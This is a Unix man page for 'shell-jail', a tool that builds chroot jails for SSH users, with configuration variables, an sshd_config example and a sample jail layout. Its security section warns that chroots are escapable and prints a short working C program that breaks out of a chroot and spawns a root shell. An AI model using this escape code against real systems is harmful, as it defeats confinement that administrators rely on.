.\" Automatically generated by Pandoc 1.15.2.1
.\"
.ad b
.hy
.TH "shell\-jail" "1" "2016\-02\-25 15:22:10" "shell\-jail" "User manual"
.SH NAME
.PP
shell\-jail \- Easy chroot environment builder
.SH SYNOPSIS
.PP
shell\-jail \f[I]config\-file\f[] \f[I]user\f[]
.SH DESCRIPTION
.PP
\f[I]shell\-jail\f[] helps you easily create chroot environments.
It was initially written to create \f[I]ssh\f[] jails.
.PP
First \f[I]shell\-jail\f[] reads the configuration file (see below for
details) and copies all required commands (and their dependencies) into
the jail directory.
The jail directory is the user\[aq]s home directory in the real file
system.
.PP
Then all \f[I]NSS\f[] information (such as \f[I]password\f[],
\f[I]shadow\f[]) is copied into the jail.
.PP
Finally all system\-related files attributes are changed to immutable to
prevent any further modification.
.SH CONFIGURATION FILE
.PP
The configuration file (see below) contains all files you want to put in
the jail.
the file consists of a \f[I]bash\f[] compatible stanza which sets 3
variables: \f[B]COMMANDS\f[], \f[B]EXTRA\f[] \f[B]EXTRA_FILES_DIRS\f[].
.TP
.B EXTRA
Files from \f[B]EXTRA\f[] variable are copied as it into the user\[aq]s
jail.
.RS
.RE
.TP
.B EXTRA_FILES_DIRS
Directory from \f[B]EXTRA_FILES_DIRS\f[] variable are copied as it into
the user\[aq]s jail in a relative way.
For example files under \f[I]/srv/extra/dir\f[] are copied into
\f[I]<USER JAIL>/\f[].
.RS
.RE
.TP
.B COMMANDS
Every file defined in \f[I]COMMANDS\f[] is copied into the user\[aq]s
jail.
Then each file is scanned for its dependencies such as library (using
ldd(1)) and devices (using strings(1)).
.RS
.RE
.SH SSH CONFIGURATION
.PP
In order to chroot a user the following stanza must be done for the
given user in \f[I]/etc/ssh/sshd_config\f[]:
.IP
.nf
\f[C]
Match\ User\ jdoe
\ \ \ \ ChrootDirectory\ /home/jdoe
\ \ \ \ X11Forwarding\ no
\ \ \ \ AllowTcpForwarding\ no
\f[]
.fi
.PP
When the user logs into the server he will be chrooted to
\f[I]/home/jdoe\f[] which structure looks like:
.IP
.nf
\f[C]
/home/jdoe
├──\ bin
│\ \ \ ├──\ cat
│\ \ \ ├──\ cp
│\ \ \ ├──\ dash
│\ \ \ ├──\ ls
│\ \ \ ├──\ mkdir
│\ \ \ ├──\ mv
│\ \ \ ├──\ rm
│\ \ \ └──\ sh\ \->\ /bin/dash
├──\ dev
│\ \ \ ├──\ net
│\ \ \ │\ \ \ └──\ tun
│\ \ \ ├──\ null
│\ \ \ └──\ tty
├──\ etc
│\ \ \ ├──\ group
│\ \ \ └──\ passwd
├──\ lib
│\ \ \ └──\ x86_64\-linux\-gnu
│\ \ \ \ \ \ \ ├──\ libacl.so.1
│\ \ \ \ \ \ \ ├──\ libattr.so.1
│\ \ \ \ \ \ \ ├──\ libc.so.6
│\ \ \ \ \ \ \ ├──\ libdl.so.2
│\ \ \ \ \ \ \ ├──\ libnss_compat\-2.19.so
│\ \ \ \ \ \ \ ├──\ libnss_compat.so.2\ \->\ libnss_compat\-2.19.so
│\ \ \ \ \ \ \ ├──\ libnss_files\-2.19.so
│\ \ \ \ \ \ \ ├──\ libnss_files.so.2\ \->\ libnss_files\-2.19.so
│\ \ \ \ \ \ \ ├──\ libpcre.so.3
│\ \ \ \ \ \ \ ├──\ libpopt.so.0
│\ \ \ \ \ \ \ ├──\ libselinux.so.1
│\ \ \ \ \ \ \ └──\ libz.so.1
├──\ lib64
│\ \ \ └──\ ld\-linux\-x86\-64.so.2
├──\ home
│\ \ \ └──\ jdoe
│\ \ \ \ \ \ \ └──\ USER\[aq]S\ FILES\ AND\ DIR
└──\ usr
\ \ \ \ ├──\ bin
\ \ \ \ │\ \ \ ├──\ rsync
\ \ \ \ │\ \ \ └──\ scp
\ \ \ \ └──\ lib
\ \ \ \ \ \ \ \ └──\ openssh
\ \ \ \ \ \ \ \ \ \ \ \ └──\ sftp\-server
\f[]
.fi
.SH SECURITY
.PP
It is relatively easy to escape from a chroot (see
https://filippo.io/escaping\-a\-chroot\-jail\-slash\-1).
So do not consider a chroot as a ultimate security solution.
.PP
This simple C program can allow you to escape from the chroot as long as
the binary is owned by root and setuid to root.
.IP
.nf
\f[C]
#include\ <sys/stat.h>
#include\ <unistd.h>
#include\ <fcntl.h>
\ 
int\ main()\ {
\ \ \ \ int\ dir_fd,\ x;
\ \ \ \ setuid(0);
\ \ \ \ mkdir(".42",\ 0755);
\ \ \ \ dir_fd\ =\ open(".",\ O_RDONLY);
\ \ \ \ chroot(".42");
\ \ \ \ fchdir(dir_fd);
\ \ \ \ close(dir_fd);\ \ 
\ \ \ \ for(x\ =\ 0;\ x\ <\ 1000;\ x++)\ chdir("..");
\ \ \ \ chroot(".");\ \ 
\ \ \ \ return\ execl("/bin/sh",\ "\-i",\ NULL);
}
\f[]
.fi
.SH SEE ALSO
.PP
sshd_config(5), ldd(1), strings(1)
.SH BUGS
.PP
No time to include bugs, command actions might seldom lead astray
user\[aq]s assumption.
.SH COPYRIGHT
.PP
Copyright © 2010\-2016 Sébastien Gross <seb•ɑƬ•chezwam•ɖɵʈ•org>.
.PP
Relesed under WTFPL (http://sam.zoy.org/wtfpl/COPYING).
.SH AUTHORS
Sébastien Gross.
